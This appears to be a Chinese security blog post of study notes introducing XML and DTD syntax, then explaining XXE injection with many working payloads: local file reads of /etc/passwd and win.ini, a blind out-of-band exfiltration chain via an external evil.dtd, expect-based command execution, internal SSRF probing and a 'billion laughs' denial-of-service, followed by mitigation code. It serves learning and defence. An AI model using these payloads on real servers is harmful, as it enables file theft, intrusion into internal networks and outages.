<h4 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h4><p><strong>·</strong>  XML 是不作为的。<br><strong>·</strong>  XML 没什么特别的。它仅仅是纯文本而已。有能力处理纯文本的软件都可以处理 XML。<br>    不过，能够读懂 XML 的应用程序可以有针对性地处理 XML 的标签。标签的功能性意义依赖于应用程序的特性。<br>*<em>· *</em> 通过 XML 您可以发明自己的标签：XML 没有预定义的标签。<br>    在 HTML 中使用的标签（以及 HTML 的结构）是预定义的。HTML 文档只使用在 HTML 标准中定义过的标签（比如 </p><p> 、</p><h1> 等等）。<br>     XML 允许创作者定义自己的标签和自己的文档结构。<p></p>
<h4 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h4><p>1.所有 XML 元素都须有关闭标签。（<strong>注释：</strong>声明不属于XML本身的组成部分。它不是 XML 元素，也不需要关闭标签。）XML可以自定义标签。<br>2.XML标签大小写敏感。<br>3.XML 必须正确地嵌套。<br>4.XML 文档必须有根元素。<br>5.XML属性值须加引号。<br>6.XML必须按顺序闭合标签。<br>7.实体引用。(详细见下方)<br>8.XML 中的注释：<code>&lt;!-- This is a comment --&gt;</code> 。<br>9.在 XML 中，空格会被保留。（HTML 会把多个连续的空格字符裁减（合并）为一个。在 XML 中，文档中的空格不会被删节。）<br>10.XML 以 LF 存储换行。</p>
<p><strong>例子</strong></p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!-- XML声明，版本&amp;编码 --&gt;
&lt;note time=&quot;2018.07.03&quot; &gt; &lt;!-- 根元素 time为属性 2018.07.03为属性值 --&gt;
&lt;to&gt;Tove&lt;/to&gt; &lt;!-- 四个子元素(to,from,heading,body) --&gt;
&lt;from&gt;Jani&lt;/from&gt;
&lt;heading&gt;Reminder&lt;/heading&gt;
&lt;body&gt;Don&#39;t forget me this weekend!&lt;/body&gt;
&lt;/note&gt; &lt;!-- 所有的节点必须闭合 --&gt;</code></pre>
<h5 id="XML实体引用"><a href="#XML实体引用" class="headerlink" title="XML实体引用"></a>XML实体引用</h5><p>在 XML 中，一些字符拥有特殊的意义。</p>
<p>如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>
<p>这样会产生 XML 错误：</p>
<pre><code>&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</code></pre><p>为了避免这个错误，请用<em>实体引用</em>来代替 “&lt;” 字符：</p>
<pre><code>&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; </code></pre><p>在 XML 中，有 5 个预定义的实体引用：</p>
<table>
<thead>
<tr>
<th>&lt;</th>
<th>&lt;</th>
<th>小于</th>
</tr>
</thead>
<tbody><tr>
<td>&gt;</td>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&amp;</td>
<td>&amp;</td>
<td>和号</td>
</tr>
<tr>
<td>&apos;</td>
<td>‘</td>
<td>单引号</td>
</tr>
<tr>
<td>&quot;</td>
<td>“</td>
<td>引号</td>
</tr>
</tbody></table>
<p><strong>注释：</strong>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p>
<p>参考链接：<a href="https://www.w3school.com.cn/xml/xml_syntax.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/xml/xml_syntax.asp</a></p>
<h4 id="为什么使用-DTD？"><a href="#为什么使用-DTD？" class="headerlink" title="为什么使用 DTD？"></a>为什么使用 DTD？</h4><blockquote>
<p>DTD”(Documnet Type Definition)是XML1.0版规格的一部分,它是XML文件得验证机制,属于XML文件组成得一部分,DTD在XML文件所扮演的角色就是定义XML文件的元素架构、元素标记和属性!一旦我们定义好DTD,在使用编辑工具如XML Spy 或者验证工具 XML validate (微软网站均可以下载)就可以对编写好的XML文件进行DTD检查内容是否为合法的XML文件内容!</p>
<p>XML文件提供应用程序一个数据交换的格式,DTD正是让XML文件能够成为数据交换的标准,因为不同的公司只需定义好标准的DTD,各公司都能够依照DTD建立XML文件,并且进行验证,如此就可以轻易建立标准一直的交换数据!</p>
<p>参考链接：<a href="https://zhidao.baidu.com/question/57994684.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/57994684.html</a></p>
</blockquote>
<p>通过 DTD，每一个 XML 文件均可携带一个有关其自身格式的描述。</p>
<p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>
<p>而应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</p>
<p>还可以使用 DTD 来验证您自身的数据。</p>
<h4 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
<blockquote>
<h5 id="XML文档的构建模块"><a href="#XML文档的构建模块" class="headerlink" title="XML文档的构建模块"></a>XML文档的构建模块</h5><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
<p>元素、属性、实体、PCDATA、CDATA。</p>
<p>1、元素<br>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p>
<pre><code>&lt;body&gt;body text in between&lt;/body&gt;
&lt;message&gt;some message in between&lt;/message&gt;</code></pre><p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p>
<p>2、属性<br> 属性可提供有关元素的额外信息<br> 实例：</p>
<pre><code>&lt;img src=&quot;computer.gif&quot; /&gt;</code></pre><p>3、实体<br>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p>
<p>4、PCDATA<br>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
<p>5、CDATA<br>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>
</blockquote>
<p>DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<p>1、内部声明：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code> </p>
<p>例子: <code>&lt;!DOCTYOE test [any]&gt;</code></p>
<p>2、外部声明（引用外部DTD）：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code> </p>
<p>例子:<code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></p>
<p>3、内外部DTD文档结合：</p>
<pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></pre><p>DTD中的一些重要的关键字：</p>
<ul>
<li>DOCTYPE（DTD的声明）</li>
<li>ENTITY（实体的声明）</li>
<li>SYSTEM、PUBLIC（外部资源申请）</li>
</ul>
<p>原文链接：<a href="https://blog.csdn.net/qq_40491569/java/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/java/article/details/83066200</a></p>
<h4 id="实体类别介绍"><a href="#实体类别介绍" class="headerlink" title="实体类别介绍"></a>实体类别介绍</h4><p>实体主要分为一下四类</p>
<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>
<p>参数实体用%实体名称申明，引用时也用%实体名称;</p>
<p>其余实体直接用实体名称申明，引用时用&amp;实体名称。</p>
<p>参数实体只能在DTD中申明，DTD中引用；</p>
<p>其余实体只能在DTD中申明，可在xml文档中引用。</p>
<p>注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的。</p>
<h4 id="DTD-实体声明："><a href="#DTD-实体声明：" class="headerlink" title="DTD 实体声明："></a>DTD 实体声明：</h4><h5 id="1-内部实体声明"><a href="#1-内部实体声明" class="headerlink" title="1. 内部实体声明"></a>1. 内部实体声明</h5><pre><code>&lt;!ENTITY 实体名称 “实体的值”&gt;</code></pre><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p>
<pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><h5 id="2-外部实体声明"><a href="#2-外部实体声明" class="headerlink" title="2. 外部实体声明"></a>2. 外部实体声明</h5><p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：</p>
<pre><code>file:///path/to/file.ext
http://url/file.ext
php://filter/read=convert.base64-encode/resource=conf.php</code></pre><pre><code>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;</code></pre><p>部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示： </p>
<p>外部实体的默认协议</p>
<p><img src="/2020/05/22/XXE%E6%BC%8F%E6%B4%9E/C:%5CUsers%5CDELL%5CPictures%5CXXE.png" alt="img"></p>
<p>​    <strong>例子</strong></p>
<p>构造几种简单的Payload模型如下:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe(实体引用名) SYSTEM &quot;file:///etc/passwd&quot;(实体内容) &gt;]&gt;
&lt;methodcall&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
&lt;/methodcall&gt;</code></pre><p>这种写法则调用了本地计算机的文件<code>/etc/passwd</code>，XML内容被解析后，文件内容便通过<code>&amp;xxe</code>被存放在了<code>methodname</code>元素中，造成了敏感信息的泄露。</p>
<p>亦可读取网站内容</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://attacker.com/text.txt&quot; &gt;]&gt;
&lt;methodcall&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
&lt;/methodcall&gt;</code></pre><p>如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;
&lt;methodcall&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
&lt;/methodcall&gt;</code></pre><h5 id="3-参数实体声明"><a href="#3-参数实体声明" class="headerlink" title="3. 参数实体声明"></a>3. 参数实体声明</h5><pre><code>&lt;!ENTITY % 实体名称 “实体的值”&gt;
or
&lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;</code></pre><p>  <strong>例子</strong></p>
<pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;
%xxe;]&gt;
&lt;foo&gt;&amp;evil;&lt;/foo&gt;</code></pre><p>外部evil.dtd中的内容。</p>
<pre><code>&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</code></pre><h5 id="4-引用公共实体"><a href="#4-引用公共实体" class="headerlink" title="4. 引用公共实体"></a>4. 引用公共实体</h5><pre><code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre><h4 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE?"></a>什么是XXE?</h4><blockquote>
<p>XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。简单理解就是当允许引用外部实体时， XML数据在传输中有可能会被不法分子被修改，如果服务器执行被恶意插入的代码，就可以实现攻击的目的攻击者可以通过构造恶意内容，就可能导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害。</p>
<p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、×××内网网站、发起dos×××等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<p><a href="https://blog.csdn.net/tangyuan569/article/details/104277419" target="_blank" rel="noopener">https://blog.csdn.net/tangyuan569/article/details/104277419</a></p>
</blockquote>
<p>有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)。</p>
<p>下面的代码将获取系统上folder/file的内容并呈现给用户：</p>
<pre><code class="xml-dtd">Code1：

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
&lt;foo&gt;
        &lt;value&gt;&amp;passwd;&lt;/value&gt;
&lt;/foo&gt;</code></pre>
<p>XML外部实体 ‘passwd’ 被赋予的值为：file:///etc/passwd。在解析XML文档的过程中，实体’passwd’的值会被替换为URI(file:///etc/passwd)内容值(也就是passwd文件的内容)。关键字’SYSTEM’会告诉XML解析器，’passwd’实体的值将从其后的URI中读取。</p>
<pre><code>Code2：

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE b [&lt;!ENTITY entityex SYSTEM &quot;file:///folder/file&quot;&gt;]&gt;
&lt;foo&gt;
        &lt;value&gt;&amp;entityex;&lt;/value&gt;
&lt;/foo&gt;</code></pre><pre><code>Code3：

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre><h4 id="如何识别xml实体攻击漏洞？"><a href="#如何识别xml实体攻击漏洞？" class="headerlink" title="如何识别xml实体攻击漏洞？"></a>如何识别xml实体攻击漏洞？</h4><p>XXE漏洞主要针对web服务危险的引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等。</p>
<p>甄别那些接受XML作为输入内容的端点。最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞。</p>
<h4 id="xxe漏洞检测"><a href="#xxe漏洞检测" class="headerlink" title="xxe漏洞检测"></a>xxe漏洞检测</h4><p>第一步检测XML是否会被成功解析：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [ 
&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;
&lt;root&gt;&amp;name;&lt;/root&gt;</code></pre><p>如果页面输出了my name is nMask，说明xml文件可以被解析。</p>
<p>![img](file:///D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\9DAFACBF50807FAE6D60C969D68AE8C7.png)</p>
<p>![img](file:///D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\7E6CB2015639C900F77DEB1317BA143E.png)</p>
<p>![img](file:///D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\7D909959654F64724543C606169FE3EC.png)</p>
<p>![img](file:///D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\05BD25FAA400763F869BF48CA301CC3F.png)</p>
<p>第二步检测服务器是否支持DTD引用外部实体：</p>
<pre><code>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; 
&lt;!DOCTYPE ANY [ 
&lt;!ENTITY % name SYSTEM &quot;http://localhost/index.html&quot;&gt; 
%name; 
]&gt;</code></pre><p>可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求index.html</p>
<blockquote>
<h4 id="从PHP代码层面上"><a href="#从PHP代码层面上" class="headerlink" title="从PHP代码层面上"></a>从PHP代码层面上</h4><p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给<code>xml</code>变量。</p>
<p>这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p>
<pre><code>&lt;?php
$data = file_get_contents(&#39;php://input&#39;);  //获取提交的XML数据
$xml = simplexml_load_string($data);  // 交给PHP的XML解析函数
echo $xml-&gt;name;
?&gt;</code></pre></blockquote>
<h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><h5 id="有回显情况"><a href="#有回显情况" class="headerlink" title="有回显情况"></a>有回显情况</h5><p>XML.php</p>
<pre><code>&lt;?php
$xml = &lt;&lt;&lt;EOF
&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;/x&gt;
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?&gt;</code></pre><p>访问XML.php可以读取etc/passwd文件内容</p>
<p>该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<p>实例展示：</p>
<p>可以使用如下的两种方式进行XXE注入攻击。</p>
<pre><code>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;


&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;
%xxe;]&gt;
&lt;foo&gt;&amp;evil;&lt;/foo&gt;</code></pre><p>外部evil.dtd中的内容。</p>
<pre><code>&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</code></pre><p><img src="https://images2018.cnblogs.com/blog/1169796/201806/1169796-20180606225720549-617477006.png" alt="img"></p>
<p>当然也可以进行内网站点的入侵。</p>
<p><img src="https://images2018.cnblogs.com/blog/1169796/201806/1169796-20180606225753086-402105663.png" alt="img"></p>
<p> 以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。</p>
<h5 id="无回显的情况"><a href="#无回显的情况" class="headerlink" title="无回显的情况"></a>无回显的情况</h5><h5 id="（blind-xxe漏洞）"><a href="#（blind-xxe漏洞）" class="headerlink" title="（blind xxe漏洞）"></a>（blind xxe漏洞）</h5><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p>
<p>创建test.php写入以下内容：</p>
<pre><code>&lt;?php 
file_put_contents(&quot;test.txt&quot;, $_GET[&#39;file&#39;]) ; 
?&gt;</code></pre><p>创建index.php写入以下内容：</p>
<pre><code>&lt;?php 
$xml=&lt;&lt;&lt;EOF 
&lt;?xml version=&quot;1.0&quot;?&gt; 
&lt;!DOCTYPE ANY[ 
&lt;!ENTITY % file SYSTEM &quot;file:///C:/test.txt&quot;&gt; 
&lt;!ENTITY % remote SYSTEM &quot;http://localhost/test.xml&quot;&gt; 
%remote;
%all;
%send; 
]&gt; 
EOF; 
$data = simplexml_load_string($xml) ; 
echo &quot;&lt;pre&gt;&quot; ; 
print_r($data) ; 
?&gt;</code></pre><p>创建test.xml并写入以下内容：</p>
<pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost/test.php?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>当访问<code>http://localhost/index.php</code>, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。</p>
<pre><code>&lt;?php
$xml = &lt;&lt;&lt;EOF
&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt; # id
]&gt;
&lt;x&gt;&amp;f;&lt;/x&gt;
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?&gt;</code></pre><p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p>
<h4 id="内网探测-SSRF"><a href="#内网探测-SSRF" class="headerlink" title="内网探测/SSRF"></a>内网探测/SSRF</h4><p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
<pre><code>&lt;?php
$xml = &lt;&lt;&lt;EOF
&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;http://192.168.1.1:80/&quot;&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;/x&gt;
EOF;
$data = simplexml_load_string($xml);
print_r($data);
?&gt;</code></pre><h4 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
   &lt;!DOCTYPE lolz [
&lt;!ENTITY lol &quot;lol&quot;&gt;
&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; 
]&gt; 
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;&lt;/pre&gt;</code></pre>
<p>这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p>
<p>链接：<a href="https://www.jianshu.com/p/e56a2b8fde8" target="_blank" rel="noopener">https://www.jianshu.com/p/e56a2b8fde8</a></p>
<p>原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。除了这些，攻击者还可以读取服务器上的敏感数据，还能通过端口扫描，获取后端系统的开放端口。</p>
<h3 id="防御XXE"><a href="#防御XXE" class="headerlink" title="防御XXE"></a>防御XXE</h3><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p>
<pre><code class="xml">PHP：

&lt;pre style=&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;libxml_disable_entity_loader(true);&lt;/pre&gt;

JAVA：

&lt;pre style=&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);&lt;/pre&gt;

Python：

&lt;pre style=&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))&lt;/pre&gt;</code></pre>
<p><strong>过滤用户提供的XML数据</strong></p>
<p>过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
<p>不允许XML中含有自己定义的DTD</p>
<p>参考链接：<a href="https://www.jianshu.com/p/e56a2b8fde80" target="_blank" rel="noopener">https://www.jianshu.com/p/e56a2b8fde80</a></p>
<p>环境搭建：<a href="https://www.yad0.com/technology_sharing/698.html" target="_blank" rel="noopener">https://www.yad0.com/technology_sharing/698.html</a></p>
</h1>  
    </div> 

    
        <!-- Division Line -->
        <div class="division"></div> 
    

    <div class="post-info-wrapper">
            
                    <!-- Post Info -->
                    <p class="post-date">2020-05-22</p>
                    
                    
                        <p class="post-info-categories">
                            
                        </p>
                    

                    
            
    </div>
</article>


    

            </main>

            <!-- 'To Top' Btn-->
            
                <div id="to-top">
    <a href="#top" class="toTop">
        <i class="fa fa-pagelines"></i>
    </a>
</div>
            

            <!-- Footer -->
            
                <footer class="footer-wrapper col-xs-12 col-sm-12">
    <div class="footer-banner-wrapper">
        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
    </div>
</footer>
            
        </div>

        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
    </body>
</html>